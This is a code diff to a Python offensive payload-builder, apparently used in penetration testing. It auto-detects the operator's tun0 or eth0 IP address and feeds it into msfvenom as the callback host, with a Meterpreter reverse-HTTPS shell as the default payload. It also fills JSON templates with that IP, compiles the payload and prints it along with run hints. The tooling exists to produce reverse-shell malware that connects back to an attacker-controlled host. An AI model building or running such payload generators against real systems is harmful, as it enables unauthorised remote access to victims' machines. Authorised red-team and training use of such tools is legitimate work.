@@ -7,16 +7,19 @@ import subprocess
 def get_tun0_ip():
     try:
         result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True, check=True)
-        output_lines = result.stdout.splitlines()
-        for line in output_lines:
-            if 'inet' in line:
-                parts = line.split()
-                for part in parts:
-                    if '.' in part:  # Check if part contains a dot (IP address)
-                        return part
     except subprocess.CalledProcessError as e:
-        print(f"Error: {e}")
-    return None
+        result = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"No eth0 or tun0 found. Giving default IP of 192.168.1.1: {e}")
+        return "192.168.1.1"
+    output_lines = result.stdout.splitlines()
+    for line in output_lines:
+        if 'inet' in line:
+            parts = line.split()
+            for part in parts:
+                if '.' in part:  # Check if part contains a dot (IP address)
+                    return part.split("/")[0]
+
 
 def Call_Msfvenom(plFormat):
     print("here")
@@ -25,8 +28,8 @@ def Call_Msfvenom(plFormat):
     if payload == "":
         payload = "windows/x64/meterpreter/reverse_https"
     print("Getting tun0 interface to default to.")
-    defaulthost = get_tun0_ip().split("/")[0]
-    lhost = input(f"Enter msfvenom lhost. I grabbed the tun0 ip, default with that is [{defaulthost}]")
+    defaulthost = get_tun0_ip()
+    lhost = input(f"Enter msfvenom lhost. I grabbed the an ip (tun0 or eth0), default with that is [{defaulthost}]")
     if lhost == "":
         lhost = defaulthost
     lport = input("Input lport. Default to [443].")
@@ -35,12 +38,13 @@ def Call_Msfvenom(plFormat):
     
     return ep_gensc.GetMetShellCode(payload, lhost, lport, plFormat)
 
-def FillTemplate(template,payload, lhost, lport):
+def FillTemplate(template):
     templateFileName = "templates/" + template + ".json"
         
     try:   
         with open(templateFileName, "r") as templateFile:
             template = json.load(templateFile)
+        print(f"Loaded template: {templateFileName}.")
     except FileNotFoundError:
         print(f"Template does not exist. File not found: {templateFileName}. Exiting.")
         exit()
@@ -65,6 +69,10 @@ def FillTemplate(template,payload, lhost, lport):
             name = customAttribute["name"]
             description = customAttribute["description"]
             defaultValue = customAttribute["defaultValue"]
+            
+            if "[[[[ownIP]]]]" in defaultValue:
+                defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())
+            
             print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default, or !describe! to print description.")
             choice = input("> ")
             if choice == "!describe!":
@@ -89,6 +97,10 @@ def FillTemplate(template,payload, lhost, lport):
                     name = customAttribute["name"]
                     description = customAttribute["description"]
                     defaultValue = customAttribute["defaultValue"]
+                    
+                    if "[[[[ownIP]]]]" in defaultValue:
+                        defaultValue = defaultValue.replace("[[[[ownIP]]]]",get_tun0_ip())
+
                     print(f"Custom attribute [{name}] must be populated. Default value is [{defaultValue}]. Enter value, press enter for default, or !describe! to print description.")
                     choice = input("> ")
                     if choice == "!describe!":
@@ -145,4 +157,10 @@ def FillTemplate(template,payload, lhost, lport):
         print(f"Starting Compilation Process")  
         ep_compile.compile(template["compilation"], content)
     
-    return content
+    if "runHint" in template:
+        print("Run hint:")
+        print(template["runHint"].replace("[[[[ownIP]]]]",get_tun0_ip()))
+
+    printtheguy = input("Print final payload? N/y.")
+    if printtheguy.lower() == "y":
+        print(content)
